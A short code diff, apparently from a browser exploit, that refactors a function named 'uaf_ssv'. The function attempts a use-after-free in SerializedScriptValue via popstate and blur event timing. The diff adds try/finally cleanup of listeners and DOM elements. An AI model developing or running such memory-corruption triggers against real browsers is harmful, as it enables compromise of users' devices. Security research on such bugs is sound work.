@@ -202,8 +202,9 @@ async function uaf_ssv(fsets, index, save_pop = false) {
 
     let pop = null;
     let num_blurs = 0;
+    let onpopstate;
     const pop_promise = new Promise((resolve, reject) => {
-        function onpopstate(event) {
+        onpopstate = function (event) {
             // debug_log('pop came');
             if (num_blurs === 0) {
                 const r = reject;
@@ -211,7 +212,7 @@ async function uaf_ssv(fsets, index, save_pop = false) {
             }
             pop = event;
             resolve();
-        }
+        };
         addEventListener('popstate', onpopstate, { once: true });
     });
 
@@ -255,6 +256,7 @@ async function uaf_ssv(fsets, index, save_pop = false) {
     // item if we call loadInSameDocument too early
     // debug_log(`readyState now: ${document.readyState}`);
 
+    try {
     if (document.readyState !== 'complete') {
         await new Promise(resolve => {
             document.addEventListener('readystatechange', function foo() {
@@ -303,6 +305,12 @@ async function uaf_ssv(fsets, index, save_pop = false) {
     }
 
     die('failed SerializedScriptValue UaF');
+    } finally {
+        input.removeEventListener('blur', onblur);
+        removeEventListener('popstate', onpopstate);
+        input.remove();
+        foo.remove();
+    }
 }
 
 class Reader {
